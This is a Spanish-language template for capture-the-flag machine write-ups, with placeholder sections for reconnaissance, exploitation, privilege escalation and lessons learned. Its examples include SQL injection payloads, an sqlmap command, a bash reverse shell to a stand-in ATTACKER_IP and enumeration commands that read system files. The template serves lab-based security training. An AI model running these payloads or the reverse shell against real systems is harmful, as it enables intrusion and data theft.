# 📋 Plantilla de Writeup Profesional

> Usa esta plantilla para cada máquina que resuelvas. Es tu carta de presentación técnica.

---

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | [Nombre] |
| **Plataforma** | HTB / THM / picoCTF |
| **Dificultad** | Easy / Medium / Hard |
| **Categoría** | Web / AD / Linux / Crypto / Forensics |
| **IP** | X.X.X.X |
| **OS** | Windows / Linux |
| **Fecha** | YYYY-MM-DD |
| **Autor** | [Tu nombre] |
| **Tiempo** | Xh XXm |

---

## 🎯 Resumen Ejecutivo

> **TL;DR:** Exploté [VULNERABILIDAD] en [SERVICIO] para obtener acceso inicial, luego escalé privilegios via [TÉCNICA] para obtener root/ADMIN.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_full.txt TARGET_IP
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 22 | SSH | OpenSSH X.X | Open |
| 80 | HTTP | Apache X.X | Open |
| 443 | HTTPS | nginx X.X | Open |

### Web Enumeration

```bash
# Directorios
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -o dirs.txt

# Subdominios
gobuster vhost -u http://TARGET_IP -w subdomains.txt

# Tecnologías
whatweb http://TARGET_IP
```

**Hallazgos:**
- [ ] Directorio oculto encontrado: `/admin`
- [ ] Archivo sensible: `.env`, `.git/config`
- [ ] Tecnología identificada: WordPress, PHP, etc.

### OSINT (si aplica)

```bash
# Buscar emails
theHarvester -d target.com -b google

# Subdominios
subfinder -d target.com -o subs.txt
```

---

## 💥 Explotación

### Vulnerabilidad Encontrada

**Tipo:** SQL Injection / XSS / SSRF / etc.
**Ubicación:** `/login.php`, parámetro `user`
**CWE:** CWE-89 (SQL Injection)
**CVSS:** 9.8 (Critical)

### Payload Utilizado

```sql
-- Bypass de autenticación
admin' OR '1'='1' --

-- Extracción de datos
' UNION SELECT username,password FROM users--

-- Con SQLMap
sqlmap -u "http://TARGET_IP/login.php" --data="user=admin&pass=test" --dbs --batch
```

### Shell Inicial

```bash
# Métodos de acceso
ssh user@TARGET_IP
# Password: [contraseña encontrada]

# O reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Resultado:**
```
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🚀 Escalada de Privilegios

### Enumeración

```bash
# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo rights
sudo -l

# Kernel version
uname -a

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Información del sistema
id
cat /etc/passwd
```

### Vector de Privesc

**Método:** SUID binary / Kernel exploit / Sudo misconfiguration

```bash
# Ejemplo: SUID binary vulnerable
/usr/local/bin/exploit

# Ejemplo: Kernel exploit
searchsploit linux kernel 4.x
```

### Root/ADMIN Obtenido

```bash
$ sudo su
# root@TARGET:~#

$ cat /root/root.txt
FLAG{...}
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `/home/user/user.txt` |
| **Root** | `FLAG{...}` | `/root/root.txt` |

---

## 📊 Métricas

| Métrica | Valor |
|---------|-------|
| **Tiempo total** | Xh XXm |
| **Puertos escaneados** | 65535 |
| **Servicios encontrados** | X |
| **Vulnerabilidades explotadas** | X |
| **Técnicas utilizadas** | [Lista] |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- [ ] [Acción que funcionó]
- [ ] [Acción que funcionó]

### ❌ Lo que NO funcionó
- [ ] [Intento fallido]
- [ ] [Intento fallido]

### 🔄 Qué haría diferente
- [ ] [Mejora en el approach]
- [ ] [Mejora en el approach]

---

## 📚 Referencias

- [MITRE ATT&CK: [Técnica]](https://attack.mitre.org/techniques/)
- [CWE-XX: [Nombre]](https://cwe.mitre.org/data/definitions/XX.html)
- [Guía relacionada](URL)

---

## 🔧 Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| Nmap | Escaneo de puertos |
| Gobuster | Enumeración de directorios |
| Burp Suite | Interceptación de tráfico |
| SQLMap | Explotación SQLi |
| Metasploit | Explotación automatizada |
| LinPEAS | Enumeración Linux |
| John the Ripper | Cracking de hashes |

---

*Writeup creado por [Tu nombre] — [Fecha]*
*Plataforma: CDPN CyberDefense Pro Network*
